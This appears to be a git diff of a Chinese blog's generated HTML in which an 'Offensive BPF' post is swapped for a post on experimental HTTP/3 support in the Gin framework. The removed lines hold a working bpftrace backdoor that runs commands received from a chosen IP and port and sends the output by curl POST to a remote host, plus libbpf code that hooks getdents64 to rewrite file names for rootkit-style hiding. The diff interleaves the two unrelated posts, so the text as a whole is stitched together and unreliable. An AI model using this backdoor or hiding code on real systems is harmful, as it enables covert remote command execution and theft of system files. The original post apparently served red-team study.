+<h2 id="现有库实现">现有库实现</h2>
+<p>具体的实现有很多可以看WIKI上的表格[6]，Cloudflare作为很早就发展http3的企业开源了一个rust写的库[4]，但是Go的开源库就只有一个quic-go</p>
+<h2 id="gin的http3支持">Gin的HTTP3支持</h2>
+<p>Gin现在并没有release支持HTTP3，但是很早就有过issue和pr实验，链接如下</p>
+<p><a href="https://github.com/gin-gonic/gin/issues/2523">Can gin support HTTP/3?</a></p>
+<p><a href="https://github.com/gin-gonic/gin/pull/3210">experimental: support http3</a></p>
+<p>其中PR的修改十分简单，只是同Gin以往的逻辑，在gin.go中添加了一个支持QUIC协议的Run函数。因QUIC协议自身支持加密，所以函数实现更像是RunTLS，需要传入证书密钥文件。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -2040,180 +1744,25 @@ kretprobe:inet_csk_accept
 </span><span class="lnt">11
 </span><span class="lnt">12
 </span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;net/sock.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/in.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/socket.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="n">BEGIN</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Welcome to Offensive BPF... Use Ctrl-C to exit.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;github.com/lucas-clemente/quic-go/http3&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="p">(</span><span class="nx">engine</span> <span class="o">*</span><span class="nx">Engine</span><span class="p">)</span> <span class="nf">RunQUIC</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">certFile</span><span class="p">,</span> <span class="nx">keyFile</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="nx">err</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">debugPrint</span><span class="p">(</span><span class="s">&#34;Listening and serving QUIC on %s\n&#34;</span><span class="p">,</span> <span class="nx">addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">defer</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span> <span class="nf">debugPrintError</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">}()</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nl">tracepoint</span><span class="p">:</span><span class="nl">syscalls</span><span class="p">:</span><span class="n">sys_exit_accept</span><span class="o">*</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="n">fd</span><span class="p">[</span><span class="n">tid</span><span class="p">]</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">ret</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">engine</span><span class="p">.</span><span class="nf">isUnsafeTrustedProxies</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">debugPrint</span><span class="p">(</span><span class="s">&#34;[WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.\n&#34;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">			<span class="s">&#34;Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nl">kprobe</span><span class="p">:</span><span class="n">sock_recvmsg</span>
-</span></span><span class="line"><span class="cl"><span class="o">/</span> <span class="err">@</span><span class="n">fd</span><span class="p">[</span><span class="n">tid</span><span class="p">]</span> <span class="o">/</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="n">socks</span><span class="p">[</span><span class="err">@</span><span class="n">fd</span><span class="p">[</span><span class="n">tid</span><span class="p">]]</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">socket</span> <span class="o">*</span><span class="p">)</span><span class="n">arg0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nl">tracepoint</span><span class="p">:</span><span class="nl">syscalls</span><span class="p">:</span><span class="n">sys_enter_recvfrom</span>
-</span></span><span class="line"><span class="cl"><span class="o">/</span> <span class="err">@</span><span class="n">fd</span><span class="p">[</span><span class="n">tid</span><span class="p">]</span> <span class="o">/</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;-&gt;sys_enter_read for allowed thread (fd: %d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="n">sys_read</span><span class="p">[</span><span class="n">tid</span><span class="p">]</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">ubuf</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nl">tracepoint</span><span class="p">:</span><span class="nl">syscalls</span><span class="p">:</span><span class="n">sys_exit_recvfrom</span>
-</span></span><span class="line"><span class="cl"><span class="o">/</span> <span class="err">@</span><span class="n">socks</span><span class="p">[</span><span class="err">@</span><span class="n">fd</span><span class="p">[</span><span class="n">tid</span><span class="p">]]</span> <span class="o">/</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">	<span class="err">$</span><span class="n">sock</span> <span class="o">=</span> <span class="err">@</span><span class="n">socks</span><span class="p">[</span><span class="err">@</span><span class="n">fd</span><span class="p">[</span><span class="n">tid</span><span class="p">]];</span>
-</span></span><span class="line"><span class="cl">	<span class="err">$</span><span class="n">dport_tmp</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint16</span><span class="p">)</span><span class="err">$</span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">__sk_common</span><span class="p">.</span><span class="n">skc_dport</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">	<span class="err">$</span><span class="n">dport</span> <span class="o">=</span> <span class="p">((</span> <span class="err">$</span><span class="n">dport_tmp</span>  <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span> <span class="err">$</span><span class="n">dport_tmp</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x00FF00</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;addr:%s port:%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ntop</span><span class="p">(</span><span class="err">$</span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">__sk_common</span><span class="p">.</span><span class="n">skc_daddr</span><span class="p">),</span> <span class="err">$</span><span class="n">dport</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="err">$</span><span class="n">dport</span> <span class="o">==</span> <span class="mi">7777</span> <span class="o">&amp;&amp;</span> <span class="err">$</span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">__sk_common</span><span class="p">.</span><span class="n">skc_daddr</span> <span class="o">==</span> <span class="mi">2156439744</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">len</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">ret</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">cmd</span> <span class="o">=</span> <span class="n">str</span><span class="p">(</span><span class="err">@</span><span class="n">sys_read</span><span class="p">[</span><span class="n">tid</span><span class="p">],</span> <span class="err">$</span><span class="n">len</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Command: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="err">$</span><span class="n">cmd</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="err">$</span><span class="n">cmd</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">(</span><span class="s">&#34;curl -X POST --data-binary @/tmp/o %s&#34;</span><span class="p">,</span> <span class="n">str</span><span class="p">(</span><span class="err">$</span><span class="mi">1</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">(</span><span class="s">&#34;rm -f /tmp/o&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">err</span> <span class="p">=</span> <span class="nx">http3</span><span class="p">.</span><span class="nf">ListenAndServeQUIC</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">certFile</span><span class="p">,</span> <span class="nx">keyFile</span><span class="p">,</span> <span class="nx">engine</span><span class="p">.</span><span class="nf">Handler</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>运行结果如下图：两个linux shell 两个windows powershell。其中powershell监听发过来的数据，linux挂载backdoor，后台启动一个nginx端口映射到80端口，开另一个linux shell使用nc指定7777端口去访问本机的80端口发送命令触发后门，因为符合代码中检测的来源ip和端口所以成功触发执行cat /etc/passwd并发送到远程windows监听处；再次使用win主机尝试连接靶机，由于目标ip不符合条件，所以没能触发后门。</p>
-<p><img src="/images/posts/offensive_bpf/image-20220617234118729.png" alt="image-20220617234118729" /></p>
-<h2 id="malicious-bpf">Malicious bpf</h2>
-<p>如果要在BPF执行期间修改数据结构可以使用bpf_probe_write_user，但是这在bpftrace中似乎不可用，所以还得看C</p>
-<p>覆盖用户空间数据可以实现一下目的：</p>
-<ul>
-<li>修改文件名：类似ls工具可以多或少数据一些信息，比如说输出一个：hacked_by_ruokeqx的文件</li>
-<li>隐藏目录或rootkit：隐藏文件名下一步就是隐藏目录并且进而隐藏进程信息  (通过 <code>/proc/</code> 文件系统)</li>
-<li>勒索软件模拟：红蓝对抗模拟勒索软件时的临时工具</li>
-<li>检测：BPF检测新姿势</li>
-</ul>
-<p>可以使用libbpf库和libbppf-bootstrap库并用Clang和LLVM带<code>-target bpf</code>参数编译</p>
-<p>libbp-bootstrap库用了libbpf以及CO-RE特性以便能够快速构建BPF程序</p>
-<p>libbpf使用较低级的构造，而BPF程序是用C编写的，而bpftrace则是快速编写简单的“类脚本”BPF程序的抽象。因此，libbpf允许更多的功能和控制，但这意味着要编写更多的代码。</p>
-<p>要多做的步骤其实和bcc与bpftrace的差别大致相同 需要添加映射并且添加trace point</p>
-<p>使用bpftrace映射，其中只需要简单的变量名—不需要其他任何东西。在libbpf中，必须定义保存数据的结构，并使用bpf_helper函数来更新或删除值</p>
-<h3 id="修改文件名">修改文件名</h3>
-<p>程序基于<a href="https://github.com/libbpf/libbpf-bootstrap">libbpf-bootstrap</a>搭建，bootstrap演示了BPF全局变量的使用(Linux 5.5+)和BPF环缓冲区的使用(Linux 5.8+)</p>
-<p>bootstrap.c是用户态加载器 bootstrap.bpf.c是bpf代码 bootstrap.h是头文件 vmlinux.h提供内核系统调用等信息</p>
-<p>通过strace可以查看系统调用 要修改文件名需要hook sys_exit_getdents64，可以通过bpftrace获取参数 其中/sys/kernel/btf/vmlinux文件是否存在表示是否开启BTF</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo bpftrace -lv tracepoint:syscalls:sys*dents64
-</span></span><span class="line"><span class="cl">BTF: using data from /sys/kernel/btf/vmlinux
-</span></span><span class="line"><span class="cl">tracepoint:syscalls:sys_enter_getdents64
-</span></span><span class="line"><span class="cl">    int __syscall_nr<span class="p">;</span>
-</span></span><span class="line"><span class="cl">    unsigned int fd<span class="p">;</span>
-</span></span><span class="line"><span class="cl">    struct linux_dirent64 * dirent<span class="p">;</span>
-</span></span><span class="line"><span class="cl">    unsigned int count<span class="p">;</span>
-</span></span><span class="line"><span class="cl">tracepoint:syscalls:sys_exit_getdents64
-</span></span><span class="line"><span class="cl">    int __syscall_nr<span class="p">;</span>
-</span></span><span class="line"><span class="cl">    long ret<span class="p">;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>编写如下代码 目的是获取数据并向d_entry中填充值 以便sys_exit_getdents64访问</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">SEC</span><span class="p">(</span><span class="s">&#34;tracepoint/syscalls/sys_enter_getdents64&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">handle_enter_getdents64</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_enter</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">tid_t</span> <span class="n">tid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">linux_dirent64</span> <span class="o">*</span><span class="n">d_entry</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">linux_dirent64</span> <span class="o">*</span><span class="p">)</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> 
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">d_entry</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dir_entries</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d_entry</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>相比起来获取变量 bpftrace就方便很多</p>
-<pre tabindex="0"><code class="language-bpftrace" data-lang="bpftrace">tracepoint:syscalls:sys_enter_getdents64
-{  
-  @dir_entries[tid] = args-&gt;dirent;
-}
-</code></pre><p>但是由于bpftrace在覆盖用户空间数据结构和迭代方面的限制，还是只能使用libbpf</p>
-<p>hook sys_exit_getdents64获取enter时保存的结构体 接下来可以遍历所有文件名然后通过bpf_probe_write_user修改</p>
-<p>迭代次数限制在256次</p>
-<p>通过使用bpf_printk进行调试打印 <code>sudo cat /sys/kernel/debug/tracing/trace_pipe</code>获取输出</p>
-<p>可以通过<code>d_type</code> 不等于 <code>DT_DIR</code> (4)来跳过目录</p>
+</div><p>其中quic-go是纯Go的QUIC实现，许多大型项目已经在使用这个库。</p>
+<p>测试也跟TestRunTLS一模一样</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -2263,189 +1812,100 @@ kretprobe:inet_csk_accept
 </span><span class="lnt">45
 </span><span class="lnt">46
 </span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span><span class="lnt">78
-</span><span class="lnt">79
-</span><span class="lnt">80
-</span><span class="lnt">81
-</span><span class="lnt">82
-</span><span class="lnt">83
-</span><span class="lnt">84
-</span><span class="lnt">85
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">SEC</span><span class="p">(</span><span class="s">&#34;tracepoint/syscalls/sys_exit_getdents64&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">handle_exit_getdents64</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_exit</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">event</span>       <span class="o">*</span><span class="n">e</span><span class="p">;</span>
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;github.com/stretchr/testify/assert&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// params[0]=url example:http://127.0.0.1:8080/index (cannot be empty)
+</span></span></span><span class="line"><span class="cl"><span class="c1">// params[1]=response status (custom compare status) default:&#34;200 OK&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1">// params[2]=response body (custom compare content)  default:&#34;it worked&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">func</span> <span class="nf">testRequest</span><span class="p">(</span><span class="nx">t</span> <span class="o">*</span><span class="nx">testing</span><span class="p">.</span><span class="nx">T</span><span class="p">,</span> <span class="nx">params</span> <span class="o">...</span><span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">params</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">t</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="s">&#34;url cannot be empty&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">tr</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Transport</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">TLSClientConfig</span><span class="p">:</span> <span class="o">&amp;</span><span class="nx">tls</span><span class="p">.</span><span class="nx">Config</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">InsecureSkipVerify</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="p">},</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">client</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Client</span><span class="p">{</span><span class="nx">Transport</span><span class="p">:</span> <span class="nx">tr</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">resp</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">client</span><span class="p">.</span><span class="nf">Get</span><span class="p">(</span><span class="nx">params</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">assert</span><span class="p">.</span><span class="nf">NoError</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">defer</span> <span class="nx">resp</span><span class="p">.</span><span class="nx">Body</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">body</span><span class="p">,</span> <span class="nx">ioerr</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadAll</span><span class="p">(</span><span class="nx">resp</span><span class="p">.</span><span class="nx">Body</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">assert</span><span class="p">.</span><span class="nf">NoError</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span> <span class="nx">ioerr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">responseStatus</span> <span class="p">=</span> <span class="s">&#34;200 OK&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">params</span><span class="p">)</span> <span class="p">&gt;</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">responseStatus</span> <span class="p">=</span> <span class="nx">params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">responseBody</span> <span class="p">=</span> <span class="s">&#34;it worked&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">params</span><span class="p">)</span> <span class="p">&gt;</span> <span class="mi">2</span> <span class="o">&amp;&amp;</span> <span class="nx">params</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">!=</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">responseBody</span> <span class="p">=</span> <span class="nx">params</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">assert</span><span class="p">.</span><span class="nf">Equal</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span> <span class="nx">responseStatus</span><span class="p">,</span> <span class="nx">resp</span><span class="p">.</span><span class="nx">Status</span><span class="p">,</span> <span class="s">&#34;should get a &#34;</span><span class="o">+</span><span class="nx">responseStatus</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">responseStatus</span> <span class="o">==</span> <span class="s">&#34;200 OK&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">assert</span><span class="p">.</span><span class="nf">Equal</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span> <span class="nx">responseBody</span><span class="p">,</span> <span class="nb">string</span><span class="p">(</span><span class="nx">body</span><span class="p">),</span> <span class="s">&#34;resp body should match&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">TestRunQUIC</span><span class="p">(</span><span class="nx">t</span> <span class="o">*</span><span class="nx">testing</span><span class="p">.</span><span class="nx">T</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">router</span> <span class="o">:=</span> <span class="nf">New</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">router</span><span class="p">.</span><span class="nf">GET</span><span class="p">(</span><span class="s">&#34;/example&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span> <span class="nx">c</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusOK</span><span class="p">,</span> <span class="s">&#34;it worked&#34;</span><span class="p">)</span> <span class="p">})</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">task</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="p">)</span><span class="n">bpf_get_current_task</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">tid_t</span> <span class="n">tid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">assert</span><span class="p">.</span><span class="nf">NoError</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span> <span class="nx">router</span><span class="p">.</span><span class="nf">RunQUIC</span><span class="p">(</span><span class="s">&#34;:8443&#34;</span><span class="p">,</span> <span class="s">&#34;./testdata/certificate/cert.pem&#34;</span><span class="p">,</span> <span class="s">&#34;./testdata/certificate/key.pem&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}()</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span> <span class="n">dir_addr</span>  <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dir_entries</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tid</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">dir_addr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// have to wait for the goroutine to start and run the server
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// otherwise the main thread will complete
